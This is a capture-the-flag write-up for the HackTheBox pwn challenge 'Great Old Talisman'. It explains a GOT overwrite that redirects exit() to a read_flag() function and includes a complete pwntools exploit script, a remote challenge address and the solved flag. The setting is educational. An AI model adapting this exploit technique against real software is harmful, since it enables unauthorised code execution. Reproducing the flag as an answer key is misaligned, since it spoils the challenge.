# Great Old Talisman
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0fedf870-97de-41d5-ae43-5f1ea48589c0)


## Lessons Learned:
- Calculating offset for exit@got entry.
- Utilizing 2 bytes overflow to overwrite exit@got.

## DESCRIPTION:
Zombies are closing in from all directions, and our situation appears dire! Fortunately, we've come across this ancient and formidable Great Old Talisman, 
a source of hope and protection. However, it requires the infusion of a potent enchantment to unleash its true power.

## HINT:
- NONE

## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f6b29c13-7977-4f4e-b6a7-837df5a4ba68)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/92266156-8059-4a1a-ae58-7e289c7beb36)


2. After decompiled the binary and reviewing the code, found the vuln at the main() function where there's a read() function call to accepts 2 bytes but users can actually fill up to `input * 8 bytes`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6fbdad50-cb60-4274-9856-ef9357fd3aa4)


3. Knowing this we can overwrite pointer of exit@got and points it to what ever we want by modifying the last 2 bytes.
4. Checking for useful functions, found a function that seems to be our goal. It's `read_flag()`.
5. This function print the content flag to us.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9ab55fc6-b267-42e9-b45e-afcd574b919e)


6. Great! The exploit flow is:

```
- Calculate the offset for exit@got entry.
- Overwrite exit@got pointer to read_flag().
```

7. To calculate the exit@got entry, we can use GDB.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/032819d5-70a7-423c-b2f0-3f1c0fc8ba85)


8. Awesome! Based from the result above, we can identify that we need to pass `-4` (because offset calculation of talis to exit@got, remember the libc and pie calculations logic) as the input.
9. Lastly, since we want to overwrite the last 2 bytes of exit@got with last 2 bytes of `read_flag()`, we can use AND operations to address of `read_flag()` with 0XFFFF.
10. After executes the AND operations, packed the bytes result into `p16() bytes wrapper` (half of 64 bit).
11. Here's the full script:

> SCRIPT

```py
from pwn import *
import os
os.system('clear')

exe = './great_old_talisman'
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

# sh = process(exe)
sh = remote('94.237.62.195',49760)

sh.sendlineafter(b'>', b'-4')
# read_flag = p16(elf.sym['read_flag'] & 0xFFFF)
# print(read_flag)
sh.sendlineafter(b':', p16(elf.sym['read_flag'] & 0xFFFF))
# gdb.attach(sh)
sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7cde9389-995a-4e14-9028-010c34d8cdbe)


## FLAG

```
HTB{t4l15m4n_G0T_ur_b4ck}
```
